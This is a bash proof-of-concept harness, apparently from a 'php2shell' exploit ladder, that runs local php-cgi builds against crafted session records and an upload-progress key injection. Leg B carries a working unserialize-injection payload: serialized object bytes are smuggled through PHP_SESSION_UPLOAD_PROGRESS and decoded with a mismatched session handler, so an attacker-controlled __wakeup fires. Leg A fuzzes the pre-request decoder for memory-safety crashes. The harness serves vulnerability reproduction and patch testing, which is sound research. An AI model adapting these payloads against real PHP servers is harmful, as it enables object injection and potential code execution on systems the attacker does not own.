#!/bin/bash
# php2shell rung 3 — the 2026-10-23 serialize-handler/upload-progress PoC port.
#
# Spec source: php/php-src@3584a98bd ("Avoid state corruption via bailout") adds
# ext/session/tests/rfc1867_no_user_code.phpt and
# rfc1867_incomplete_class_reserved_props.phpt — the vendor's own regression
# recipes for this vector. This harness ports them to a standalone loopback-only
# driver so they run against ANY lab build, affected (8.4.26) or fixed (8.4.27):
#
#   Leg A (memory-safety producer): a hand-crafted session record on disk is
#     decoded by the rfc1867 upload-progress handler during the multipart POST
#     parse, BEFORE RINIT (script not compiled, no user code may run). On the
#     affected tree the decode/encode is a plain unserialize; watch for
#     sanitizer reports, ZEND_ASSERT aborts, crashes, and which warnings appear.
#   Leg B (circulating PoC core): session file written under php_serialize via
#     the upload-progress key injection (PHP_SESSION_UPLOAD_PROGRESS carries
#     the crafted bytes), then a worker doing ini_set('session.serialize_handler',
#     'php') before session_start() decodes it with the wrong handler — the
#     classic unserialize-injection primitive. Marker class proves (or refutes)
#     attacker-controlled __wakeup on each build.
#
# Usage: bash lab/repro/php2shell-rung3-rfc1867.sh <php-cgi-bin> [outdir]
#   php-cgi-bin: lab/build/php-<ver>-<mode>/sapi/cgi/php-cgi
# Everything stays on loopback-free local process pipes (no network at all).

set -u
CGI=$(readlink -f "$1")
OUT=${2:-lab/build/evidence}
LABEL=$(basename "$(dirname "$(dirname "$(dirname "$1")")")" | sed 's/^php-//')
mkdir -p "$OUT"
LOG="$OUT/rung3-rfc1867-$LABEL.log"
: > "$LOG"

D=$(mktemp -d)   # per-case scratch: sess dir + workers
trap 'rm -rf "$D"' EXIT
SESS="$D/sess"; mkdir -p "$SESS"
SID="pocsid"

BOUNDARY='---------------------------20896060251896012921717172737'

# multipart body: PHPSESSID field (session.use_cookies=0 so the id rides the
# form), PHP_SESSION_UPLOAD_PROGRESS, one small file part.
mpbody() { # $1 = upload-progress key bytes
  printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n%s\r\n" "$BOUNDARY" "$SID"
  printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
  printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"f.txt\"\r\n\r\n1\r\n" "$BOUNDARY"
  printf -- "--%s--\r\n" "$BOUNDARY"
}

# run_cgi <bodyfile> [extra -d args...] -> stdout+stderr appended to $LOG
run_cgi() {
  local body="$1"; shift
  local len; len=$(stat -c %s "$body")
  REDIRECT_STATUS=1 REQUEST_METHOD=POST \
  CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY" \
  CONTENT_LENGTH="$len" \
  SCRIPT_FILENAME="$D/worker.php" PATH_TRANSLATED="$D/worker.php" \
  QUERY_STRING='' \
  ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
  "$CGI" -n -q \
    -d error_reporting='E_ALL&~E_DEPRECATED' -d html_errors=0 \
    -d file_uploads=1 -d upload_max_filesize=1024 \
    -d session.save_path="$SESS" \
    -d session.name=PHPSESSID \
    -d session.use_strict_mode=0 -d session.use_cookies=0 \
    -d session.use_only_cookies=0 -d session.cache_limiter='' \
    -d session.save_handler=files \
    -d session.upload_progress.enabled=1 \
    -d session.upload_progress.cleanup=0 \
    -d session.upload_progress.prefix=upload_progress_ \
    -d session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS \
    -d session.upload_progress.freq='1%' \
    -d session.upload_progress.min_freq='0.000000001' \
    "$@" -f "$D/worker.php" < "$body"
}

# ============ Leg A: rfc1867 decodes crafted records pre-RINIT ============
# Records exactly as the vendor tests carry them (php-handler format).
# W/U/Cust/Suit/Missing per rfc1867_no_user_code.phpt; the reserved-prop
# and corrupt cases per rfc1867_incomplete_class_reserved_props.phpt.
printf '<?php' > "$D/worker.php"
BODY="$D/body.txt"; mpbody key > "$BODY"

A_case() { # $1=label  $2=record (literal, or @file for binary records)
  local label="$1" record="$2"
  if [[ "$record" == @* ]]; then
    cp "${record#@}" "$SESS/sess_$SID"
    echo "---- A [$label] record: (binary from ${record#@})" >> "$LOG"
  else
    printf '%s' "$record" > "$SESS/sess_$SID"
    echo "---- A [$label] record: $record" >> "$LOG"
  fi
  run_cgi "$BODY" -d session.serialize_handler=php >> "$LOG" 2>&1
  local rc=$?
  local after=""
  [ -f "$SESS/sess_$SID" ] && after=$(cat "$SESS/sess_$SID")
  echo "   rc=$rc  sess-file-after: $after" >> "$LOG"
  # re-arm for next case
  rm -f "$SESS"/sess_*
  if grep -nE 'AddressSanitizer|runtime error:|SEGV|Assertion|SUMMARY' "$LOG" >/dev/null 2>&1; then
    echo "   !! sanitizer/assert signal — stopping further cases" >> "$LOG"
    return 9
  fi
  return 0
}

A_case control          'x|O:8:"stdClass":1:{s:1:"a";i:1;}'
A_case no_user_code     'w|O:1:"W":1:{s:1:"a";i:1;}u|O:1:"U":1:{s:1:"a";i:2;}c|C:4:"Cust":7:{payload}e|a:2:{i:0;E:11:"Suit:Hearts";i:1;r:7;}m|O:7:"Missing":1:{s:1:"x";i:3;}' || true
A_case Class_Name       'x|O:8:"stdClass":1:{s:27:"__PHP_Incomplete_Class_Name";s:3:"foo";}' || true
A_case Class_Serialized 'x|O:8:"stdClass":1:{s:33:"__PHP_Incomplete_Class_Serialized";s:3:"foo";}' || true
A_case Enum_Case        'x|O:8:"stdClass":1:{s:26:"__PHP_Incomplete_Enum_Case";s:3:"foo";}' || true
A_case nested           'x|a:1:{i:0;O:8:"stdClass":1:{s:27:"__PHP_Incomplete_Class_Name";s:3:"foo";}}' || true
# mangled record carries raw NUL bytes (protected-prop mangling) — built
# with printf so no bash argument/substitution can strip them (observed:
# $(...) silently dropped \0 and the case degraded to a length mismatch)
printf 'x|O:8:"stdClass":1:{s:30:"\000A\000__PHP_Incomplete_Class_Name";s:3:"foo";}' > "$D/mangled.bin"
A_case mangled          "@$D/mangled.bin" || true
A_case corrupt          'x|not-serialized-at-all' || true
# Unresolved-class variants of the vendor's reserved-prop cases: the vendor
# tests used stdClass (resolvable, so no incomplete-class bookkeeping happens
# at all). With a MISSING class the decode creates __PHP_Incomplete_Class,
# whose bookkeeping itself stores the class name under the reserved prop
# names — an attacker-supplied prop of the same name collides with it.
A_case missing_cls_name 'x|O:7:"Missing":1:{s:27:"__PHP_Incomplete_Class_Name";s:3:"foo";}' || true
A_case missing_cls_ser  'x|O:7:"Missing":1:{s:33:"__PHP_Incomplete_Class_Serialized";s:3:"foo";}' || true
A_case missing_cls_enum 'x|O:7:"Missing":1:{s:26:"__PHP_Incomplete_Enum_Case";s:3:"foo";}' || true
A_case missing_ctrl     'x|O:7:"Missing":1:{s:1:"a";i:1;}' || true

# ============ Leg B: php_serialize write, runtime switch to php decode ============
# Request 1: ini handler php_serialize; the upload-progress key becomes
# "upload_progress_<crafted>" inside the php_serialize-wrapped session file.
# Request 2: worker defines W, ini_sets the handler to php, session_start().
# If the crafted "|" splits the php-handler decode, W::__wakeup fires.
cat > "$D/worker.php" <<'EOF'
<?php
class W {
    public $a = 1;
    function __wakeup() { echo "MARKER_W_WAKEUP\n"; }
}
ini_set('session.serialize_handler', 'php');
session_start();
var_dump(isset($_SESSION['w_x']));
EOF

CRAFT='x|O:1:"W":1:{s:1:"a";i:1;}'
rm -f "$SESS"/sess_*
BODY="$D/body.txt"; mpbody "$CRAFT" > "$BODY"

echo "---- B [php_serialize write] craft-key: upload_progress_$CRAFT" >> "$LOG"
printf '<?php' > "$D/worker.php"
run_cgi "$BODY" -d session.serialize_handler=php_serialize >> "$LOG" 2>&1
echo "   rc=$?  file-after-write: $(cat "$SESS/sess_$SID" 2>/dev/null)" >> "$LOG"

# request 2 decodes with handler switched at runtime
cat > "$D/worker.php" <<'EOF'
<?php
class W {
    public $a = 1;
    function __wakeup() { echo "MARKER_W_WAKEUP\n"; }
}
ini_set('session.serialize_handler', 'php');
session_start();
var_dump(isset($_SESSION['w_x']));
EOF
echo "---- B [runtime ini_set(php) + session_start decode]" >> "$LOG"
run_cgi "$BODY" -d session.serialize_handler=php_serialize >> "$LOG" 2>&1
echo "   rc=$?" >> "$LOG"

# ============ verdict ============
echo "== verdict scan (log: $LOG)"
if grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG"; then
  echo "   SIGNAL: sanitizer/assert output present — rung-3 candidate, inspect log"
  grep -nE 'AddressSanitizer|runtime error:|SEGV|Assertion|SUMMARY' "$LOG" | head
  exit 3
fi
if grep -q 'MARKER_W_WAKEUP' "$LOG"; then
  echo "   Leg B: unserialize-injection marker FIRED (attacker-controlled __wakeup)"
else
  echo "   Leg B: marker absent"
fi
echo "   Leg A cases ran; warnings/destructions logged — inspect $LOG"
grep -cE 'Warning:' "$LOG" | sed 's/^/   total warnings: /'
exit 0
